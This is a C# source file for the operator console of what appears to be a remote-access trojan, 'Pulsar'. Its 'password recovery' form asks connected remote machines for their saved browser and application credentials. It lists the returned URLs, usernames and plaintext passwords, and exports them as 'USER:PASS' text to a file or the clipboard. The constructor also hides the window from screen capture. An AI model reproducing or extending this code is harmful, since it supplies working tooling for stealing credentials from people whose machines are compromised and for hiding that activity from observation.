using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Common.Helpers;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmPasswordRecovery : Form
    {
        /// <summary>
        /// The clients which can be used for the password recovery.
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// The message handler for handling the communication with the clients.
        /// </summary>
        private readonly PasswordRecoveryHandler _recoveryHandler;

        /// <summary>
        /// Represents a value to display in the ListView when no results were found.
        /// </summary>
        private readonly RecoveredAccount _noResultsFound = new RecoveredAccount()
        {
            Application = "No Results Found",
            Url = "N/A",
            Username = "N/A",
            Password = "N/A"
        };

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmPasswordRecovery"/> class using the given clients.
        /// </summary>
        /// <param name="clients">The clients used for the password recovery form.</param>
        public FrmPasswordRecovery(Client[] clients)
        {
            _clients = clients;
            _recoveryHandler = new PasswordRecoveryHandler(clients);

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Registers the password recovery message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            foreach (var client in _clients)
            {
                if (client != null)
                    client.ClientState += ClientDisconnected;
            }
            _recoveryHandler.AccountsRecovered += AddPasswords;
            MessageHandler.Register(_recoveryHandler);
        }

        /// <summary>
        /// Unregisters the password recovery message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            foreach (var client in _clients)
            {
                if (client != null)
                    client.ClientState -= ClientDisconnected;
            }
            MessageHandler.Unregister(_recoveryHandler);
            _recoveryHandler.AccountsRecovered -= AddPasswords;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                if (IsHandleCreated)
                {
                    BeginInvoke((MethodInvoker)(() =>
                    {
                        if (_clients.All(c => c == null || !c.Connected))
                            Close();
                    }));
                }
            }
        }

        private void FrmPasswordRecovery_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Password Recovery", _clients.Length);
            txtFormat.Text = Settings.SaveFormat;
            RecoverPasswords();
        }

        private void FrmPasswordRecovery_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.SaveFormat = txtFormat.Text;
            UnregisterMessageHandler();
        }

        private void RecoverPasswords()
        {
            clearAllToolStripMenuItem_Click(null, null);
            _recoveryHandler.BeginAccountRecovery();
        }

        private void AddPasswords(object sender, string clientIdentifier, List<RecoveredAccount> accounts, List<PasswordRecoverySource> sources, bool truncated)
        {
            try
            {
                if (accounts == null || accounts.Count == 0) // no accounts found
                {
                    if (sources == null || sources.Count == 0)
                    {
                        var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };
                        lvi.SubItems.Add(_noResultsFound.Url);
                        lvi.SubItems.Add(_noResultsFound.Username);
                        lvi.SubItems.Add(_noResultsFound.Password);
                        var lvg = GetGroupFromApplication(_noResultsFound.Application);
                        if (lvg == null)
                        {
                            lvg = new ListViewGroup { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
                            lstPasswords.Groups.Add(lvg);
                        }
                        lvi.Group = lvg;
                        lstPasswords.Items.Add(lvi);
                    }
                }

                var items = new List<ListViewItem>();
                if (accounts != null)
                {
                    foreach (var acc in accounts)
                    {
                        var lvi = new ListViewItem { Tag = acc, Text = clientIdentifier };
                        lvi.SubItems.Add(acc.Url);
                        lvi.SubItems.Add(acc.Username);
                        lvi.SubItems.Add(acc.Password);
                        var lvg = GetGroupFromApplication(acc.Application);
                        if (lvg == null)
                        {
                            lvg = new ListViewGroup { Name = acc.Application.Replace(" ", string.Empty), Header = acc.Application };
                            lstPasswords.Groups.Add(lvg);
                        }
                        lvi.Group = lvg;
                        items.Add(lvi);
                    }
                }

                lstPasswords.Items.AddRange(items.ToArray());

                if (sources != null)
                {
                    foreach (var source in sources)
                    {
                        var statusAccount = new RecoveredAccount
                        {
                            Application = $"{source.Application ?? "Browser"} [{source.Status}]",
                            Url = string.IsNullOrEmpty(source.Profile) ? "N/A" : source.Profile,
                            Username = string.IsNullOrEmpty(source.Detail) ? source.Status.ToString() : source.Detail,
                            Password = $"{source.AccountCount} account(s)"
                        };
                        var lvi = new ListViewItem { Tag = statusAccount, Text = clientIdentifier };
                        lvi.SubItems.Add(statusAccount.Url);
                        lvi.SubItems.Add(statusAccount.Username);
                        lvi.SubItems.Add(statusAccount.Password);
                        var lvg = GetGroupFromApplication(statusAccount.Application);
                        if (lvg == null)
                        {
                            lvg = new ListViewGroup
                            {
                                Name = statusAccount.Application.Replace(" ", string.Empty),
                                Header = statusAccount.Application
                            };
                            lstPasswords.Groups.Add(lvg);
                        }
                        lvi.Group = lvg;
                        lstPasswords.Items.Add(lvi);
                    }
                }

                if (truncated)
                {
                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };
                    lvi.SubItems.Add("Extraction truncated");
                    lvi.SubItems.Add("N/A");
                    lvi.SubItems.Add("Only bounded results are shown");
                    var lvg = GetGroupFromApplication("Extraction Status");
                    if (lvg == null)
                    {
                        lvg = new ListViewGroup { Name = "ExtractionStatus", Header = "Extraction Status" };
                        lstPasswords.Groups.Add(lvg);
                    }
                    lvi.Group = lvg;
                    lstPasswords.Items.Add(lvi);
                }

                UpdateRecoveryCount();
            }
            catch
            {
            }
        }

        private void UpdateRecoveryCount()
        {
            groupBox1.Text = $"Recovered Accounts [ {lstPasswords.Items.Count} ]";
        }

        private string ConvertToFormat(string format, RecoveredAccount login)
        {
            if (login == null)
                return string.Empty;
            if (string.IsNullOrEmpty(format))
                format = "APP - URL - USER:PASS";
            if (format.Length > 256)
                format = format.Substring(0, 256);
            return format
                .Replace("APP", login.Application ?? string.Empty)
                .Replace("URL", login.Url ?? string.Empty)
                .Replace("USER", login.Username ?? string.Empty)
                .Replace("PASS", login.Password ?? string.Empty);
        }

        private StringBuilder GetLoginData(bool selected = false)
        {
            StringBuilder sb = new StringBuilder();
            string format = txtFormat.Text;

            if (selected)
            {
                foreach (ListViewItem lvi in lstPasswords.SelectedItems)
                {
                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
                }
            }
            else
            {
                foreach (ListViewItem lvi in lstPasswords.Items)
                {
                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
                }
            }

            return sb;
        }

        #region Group Methods
        private ListViewGroup GetGroupFromApplication(string app)
        {
            ListViewGroup lvg = null;
            foreach (var @group in lstPasswords.Groups.Cast<ListViewGroup>().Where(@group => @group.Header == app))
            {
                lvg = @group;
            }
            return lvg;
        }

        #endregion

        #region Menu

        #region Saving

        #region File Saving
        private void saveAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        File.WriteAllText(sfdPasswords.FileName, sb.ToString(), Encoding.UTF8);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(this, "Could not save the recovery results: " + ex.Message,
                            "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private void saveSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        File.WriteAllText(sfdPasswords.FileName, sb.ToString(), Encoding.UTF8);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(this, "Could not save the selected recovery results: " + ex.Message,
                            "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }
        #endregion
        #region Clipboard Copying
        private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            if (!ClipboardHelper.SetClipboardTextSafe(sb.ToString()))
                MessageBox.Show(this, "The recovery results could not be copied to the clipboard.",
                    "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            if (!ClipboardHelper.SetClipboardTextSafe(sb.ToString()))
                MessageBox.Show(this, "The selected recovery results could not be copied to the clipboard.",
                    "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
        #endregion

        #endregion

        #region Misc

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RecoverPasswords();
        }

        private void clearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstPasswords.Items.Clear();
            lstPasswords.Groups.Clear();

            UpdateRecoveryCount();
        }

        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
            {
                lstPasswords.Items.Remove(lstPasswords.SelectedItems[i]);
            }
        }

        #endregion

        #endregion
    }
}
